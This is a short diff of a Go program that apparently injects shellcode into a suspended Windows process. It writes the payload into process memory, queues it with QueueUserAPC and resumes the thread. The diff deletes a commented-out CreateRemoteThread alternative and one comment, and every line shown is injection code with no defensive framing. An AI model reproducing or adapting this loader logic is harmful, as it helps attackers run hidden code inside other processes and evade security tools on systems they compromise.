@@ -119,28 +119,6 @@ func main() {
 		fmt.Println("[-] Error writing process memory: ", err)
 		return
 	}
-
-	// destination := unsafe.Slice((*byte)(unsafe.Pointer(memAlloc)), len(actualShellCode))
-	// copy(destination, actualShellCode)
-
-	// var oldprotect uint32
-
-	// memExec := windows.VirtualProtect(memAlloc, uintptr(len(actualShellCode)), windows.PAGE_EXECUTE_READ, &oldprotect)
-	// if memExec != nil {
-	// 	fmt.Println("[-] Error allocating memory: ", err)
-	// 	return
-	// }
-
-	// procCreateRemoteThread := KERNELDLL.NewProc("CreateRemoteThread")
-	// h, _, err := procCreateRemoteThread.Call(0, 0, 0, uintptr(memAlloc), 0, 0, 0)
-
-	// if err != nil {
-	// 	fmt.Printf("Error creating remote thread: %v\n", err)
-	// 	return
-	// }
-
-	// windows.WaitForSingleObject(windows.Handle(pi.Thread), windows.INFINITE)
-
 	procQueueUserAPC := KERNELDLL.NewProc("QueueUserAPC")
 	success1, _, lastErr := procQueueUserAPC.Call(addr, uintptr(pi.Thread), 0)
 	if success1 == 0 {
@@ -150,7 +128,6 @@ func main() {
 	_, err = windows.ResumeThread(windows.Handle(pi.Thread))
 	if err != nil {
 		fmt.Printf("Error resuming thread: %v\n", err)
-		// Close handles even if resume fails
 		windows.CloseHandle(pi.Process)
 		windows.CloseHandle(pi.Thread)
 		return
